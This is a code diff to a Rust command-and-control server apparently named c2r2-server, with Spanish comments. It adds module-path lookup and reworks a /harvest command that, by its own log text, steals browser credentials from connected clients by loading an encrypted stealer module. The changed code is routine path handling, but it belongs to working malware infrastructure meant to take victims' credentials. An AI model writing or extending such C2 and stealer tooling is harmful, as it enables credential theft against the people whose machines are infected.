@@ -4,7 +4,8 @@ use tokio::sync::mpsc;
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicU64, Ordering};
-use std::path::Path;
+use std::path::{Path, PathBuf};
+use std::env;
 use clap::Parser;
 use chrono::Local;
 use colored::*;
@@ -68,6 +69,38 @@ struct ClientHandle {
     id: ClientId,
     info: Arc<Mutex<ClientInfo>>,
     tx: mpsc::UnboundedSender<String>,
+}
+
+/// Obtiene la ruta al directorio modules/
+/// Busca en:
+/// 1. ./modules/ (si ejecutas desde c2r2-server/)
+/// 2. ./c2r2-server/modules/ (si ejecutas desde raíz)
+/// 3. <exe_dir>/modules/ (si ejecutas el binario)
+fn get_modules_path() -> PathBuf {
+    // Opción 1: modules/ en directorio actual
+    let path1 = PathBuf::from("modules");
+    if path1.exists() {
+        return path1;
+    }
+    
+    // Opción 2: c2r2-server/modules/ desde raíz
+    let path2 = PathBuf::from("c2r2-server/modules");
+    if path2.exists() {
+        return path2;
+    }
+    
+    // Opción 3: modules/ relativo al ejecutable
+    if let Ok(exe) = env::current_exe() {
+        if let Some(exe_dir) = exe.parent() {
+            let path3 = exe_dir.join("modules");
+            if path3.exists() {
+                return path3;
+            }
+        }
+    }
+    
+    // Fallback: modules/ en directorio actual (aunque no exista)
+    PathBuf::from("modules")
 }
 
 // Maneja la comunicación con un cliente
@@ -821,18 +854,21 @@ async fn main() {
                             info!("[{}] Comando /harvest: Robando credenciales de browsers", id);
                             
                             // Verificar que existan los archivos del módulo
-                            let stealer_enc_path = "modules/stealer.enc";
-                            let stealer_key_path = "modules/stealer.key";
+                            let modules_dir = get_modules_path();
+                            let stealer_enc_path = modules_dir.join("stealer.enc");
+                            let stealer_key_path = modules_dir.join("stealer.key");
                             
-                            if !Path::new(stealer_enc_path).exists() {
-                                println!("{}", "❌ Error: modules/stealer.enc no encontrado".bright_red());
-                                println!("{}", "   Genera el módulo con: cd builder && cargo run -- encrypt-module".bright_yellow());
+                            if !stealer_enc_path.exists() {
+                                println!("{}", "❌ Error: stealer.enc no encontrado".bright_red());
+                                println!("   Ruta buscada: {}", stealer_enc_path.display());
+                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
                                 continue;
                             }
                             
-                            if !Path::new(stealer_key_path).exists() {
-                                println!("{}", "❌ Error: modules/stealer.key no encontrado".bright_red());
-                                println!("{}", "   Genera el módulo con: cd builder && cargo run -- encrypt-module".bright_yellow());
+                            if !stealer_key_path.exists() {
+                                println!("{}", "❌ Error: stealer.key no encontrado".bright_red());
+                                println!("   Ruta buscada: {}", stealer_key_path.display());
+                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
                                 continue;
                             }
                             
